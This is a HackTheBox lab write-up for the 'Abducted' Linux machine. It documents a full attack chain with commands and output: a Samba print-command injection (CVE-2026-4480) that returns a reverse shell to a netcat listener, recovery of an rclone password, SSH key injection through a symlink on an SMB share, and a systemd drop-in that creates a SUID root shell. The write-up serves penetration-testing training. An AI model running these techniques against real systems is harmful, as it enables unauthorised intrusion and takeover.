
# HTB Abducted - Writeup

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=flat-square&logo=hackthebox&logoColor=black)
![OS](https://img.shields.io/badge/OS-Linux-informational?style=flat-square&logo=linux&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-ffb347?style=flat-square)
![Status](https://img.shields.io/badge/Status-Seasonal-blue?style=flat-square)

![Pwned](images/banner.png)
---

## Overview

**Abducted** is an Medium-rated Linux machine on HackTheBox. The attack chain begins with unauthenticated RCE against Samba's print subsystem via CVE-2026-4480 (`%J` shell injection), landing a shell as `nobody`. From there, an rclone configuration file leaks obfuscated SFTP credentials, which are recovered and reused to authenticate as `scott` over SSH. Finally, an SMB share misconfiguration (`force user = marcus`, `wide links = yes`) is abused to inject an SSH key into `marcus`'s home directory via a symlink traversal attack. Privilege escalation to root exploits write access to a systemd drop-in directory paired with polkit-permitted service restarts, placing a SUID bash binary at `/tmp/.rb`.

| Detail | Value |
|---|---|
| Machine Name | Abducted |
| IP Address | `10.129.244.177` |
| Hostname | `ABDUCTED` |
| OS | Linux (Ubuntu) |
| Difficulty | Medium |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Foothold — CVE-2026-4480 Samba Print-Command Injection](#2-foothold--cve-2026-4480-samba-print-command-injection)
3. [Credential Discovery — rclone.conf](#3-credential-discovery--rcloneconf)
4. [SSH Access as scott](#4-ssh-access-as-scott)
5. [Lateral Movement — scott → marcus](#5-lateral-movement--scott--marcus)
6. [Privilege Escalation — marcus → root](#6-privilege-escalation--marcus--root)

---

## 1. Reconnaissance

### Port Scan

```
sudo nmap -sC -sV 10.129.244.177
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```

Three ports open: SSH and Samba (139/445). The NetBIOS name confirms the hostname as `ABDUCTED`. SMB signing is enabled but not required.

### SMB Share Enumeration

```bash
smbclient -L //10.129.244.177 -N
```

```
Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       Hartley Group Document Services
```

Three notable shares: a printer (`HP-Reception`), a file share (`projects`), and a transfer share (`transfer`). The server string `Hartley Group Document Services` establishes the organisational context.

The `HP-Reception` printer share is guest-accessible — a critical detail given the CVE.

---

## 2. Foothold — CVE-2026-4480 Samba Print-Command Injection

### Vulnerability

**CVE-2026-4480** (CVSS 10.0) is a pre-authentication OS command injection in Samba's print subsystem. When a print job finishes spooling, Samba executes the configured `print command` via `system()`, substituting `%J` with the client-supplied job description. Prior to the fix, the only sanitisation applied was `'` → `_`, meaning shell metacharacters (`|`, `;`, `&`, spaces, backticks) pass through unescaped directly into the shell.

Preconditions:
- A guest-accessible printer share
- `print command` in `smb.conf` references `%J`
- `printing = sysv` (not `cups`/`iprint`)

All three conditions are met by the `HP-Reception` share on this target.

**Fixed in:** Samba 4.22.10, 4.23.8, 4.24.3

### Exploitation

Using the public PoC: [TheCyberGeek/CVE-2026-4480-PoC](https://github.com/TheCyberGeek/CVE-2026-4480-PoC)

```bash
# Terminal 1 — start listener
nc -lvnp 4444

# Terminal 2 — fire exploit
python3 exploit.py 10.129.244.177 10.10.14.100 4444 -P HP-Reception
```

This submits a print job whose description contains a reverse shell payload. When `smbd` processes the job end, it executes the `print command` with the injected payload in place of `%J`, connecting back to the listener.

Shell received as `nobody`.

---

## 3. Credential Discovery — rclone.conf

Enumerating from the `nobody` shell:

```bash
cat /opt/offsite-backup/rclone.conf
```

```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

The password is stored in rclone's obfuscated format. Reveal it:

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

```
iXzvcib3SrpZ
```

Credential: `svc-backup : iXzvcib3SrpZ`

---

## 4. SSH Access as scott

Enumerate local users with home directories:

```bash
cut -d: -f1,6 /etc/passwd | grep '/home/' | cut -d: -f1
```

```
scott
marcus
```

Test the recovered password against both:

```bash
ssh scott@10.129.244.177
# password: iXzvcib3SrpZ
```

Access granted as `scott`. Retrieve the user flag:

```bash
cat ~/user.txt
```

---

## 5. Lateral Movement — scott → marcus

### SMB Share Misconfiguration Analysis

Inspecting `smb.conf` as `scott`:

```bash
cat /etc/samba/smb.conf
```

Key settings in the `transfer` share definition:

```ini
[transfer]
    path = /srv/transfer
    valid users = scott
    force user = marcus
    read only = no
    wide links = yes
    browseable = yes

[global]
    unix extensions = no
    allow insecure wide links = yes
```

The dangerous combination:
- `force user = marcus` — all filesystem operations execute as `marcus`
- `wide links = yes` + `allow insecure wide links = yes` — symlinks are followed outside the share root
- `unix extensions = no` — required for wide links to function

This means `scott` can place a symlink anywhere inside `/srv/transfer` and SMB will follow it with `marcus`'s privileges — including writing to `/home/marcus`.

### SSH Key Injection

Generate a throwaway keypair:

```bash
ssh-keygen -q -t ed25519 -N '' -f /tmp/k
```

Create a symlink inside the share pointing to `marcus`'s home directory:

```bash
ln -s /home/marcus /srv/transfer/mh
```

Use `smbclient` as `scott` to traverse the symlink and write the public key into `marcus`'s `authorized_keys`:

```bash
smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
```

SSH in as `marcus`:

```bash
ssh -i /tmp/k marcus@127.0.0.1
```

---

## 6. Privilege Escalation — marcus → root

### Writable systemd Drop-in Directory

```bash
ls -ld /etc/systemd/system/smbd.service.d
```

```
drwxrws--- 2 root operators 4096 Jun  4 13:41 /etc/systemd/system/smbd.service.d
```

`marcus` is in the `operators` group, which owns this directory with write (`rwxrws`). This allows creating a drop-in override file that injects `ExecStartPre` directives into the smbd service without modifying the base unit.

### Polkit Permissions

Confirm `marcus` can reload the daemon and restart smbd without a password via polkit:

```bash
for action in $(pkaction); do
  pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "ALLOWED: $action"
done
```

Relevant allowed actions:

```
ALLOWED: org.freedesktop.systemd1.reload-daemon
ALLOWED: org.freedesktop.login1.inhibit-delay-shutdown
ALLOWED: org.freedesktop.login1.set-self-linger
```

`org.freedesktop.systemd1.reload-daemon` is all that's needed.

### Exploit

Write a malicious drop-in that copies bash and sets the SUID bit as `ExecStartPre` hooks:

```bash
cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF
```

Reload the daemon and restart smbd:

```bash
systemctl daemon-reload
systemctl restart smbd
```

Verify:

```bash
ls -l /tmp/.rb
```

```
-rwsr-xr-x 1 root root 1446024 Jun  9 17:38 /tmp/.rb
```

Execute as root:

```bash
/tmp/.rb -p -c 'id; cat /root/root.txt'
```

---

## Attack Chain Summary

```
Nmap → SMB enumeration → guest printer share (HP-Reception)
  └─► CVE-2026-4480: %J print-command injection → RCE as nobody
        └─► rclone.conf → obfuscated password reveal → svc-backup:iXzvcib3SrpZ
              └─► SSH as scott (password reuse)
                    └─► smb.conf: force user=marcus + wide links → symlink traversal
                          └─► SSH key injected into /home/marcus → shell as marcus
                                └─► operators group → writable smbd.service.d
                                      └─► polkit daemon-reload + restart smbd allowed
                                            └─► ExecStartPre SUID bash → root
```

---

## Key Takeaways

| Finding | Impact |
|---|---|
| Guest printer share with `%J` in print command | Pre-auth RCE (CVE-2026-4480) |
| rclone obfuscated password in world-readable config | Credential recovery |
| Password reuse across service and local accounts | SSH foothold as `scott` |
| `force user` + `wide links` in Samba share | Symlink traversal → SSH key injection |
| `operators` group write access to systemd drop-in dir | Arbitrary `ExecStartPre` as root |
| Polkit allows unprivileged service restart | Trigger for SUID binary creation |

*Writeup by Rajdeep Sarkar - HackTheBox retired machine*

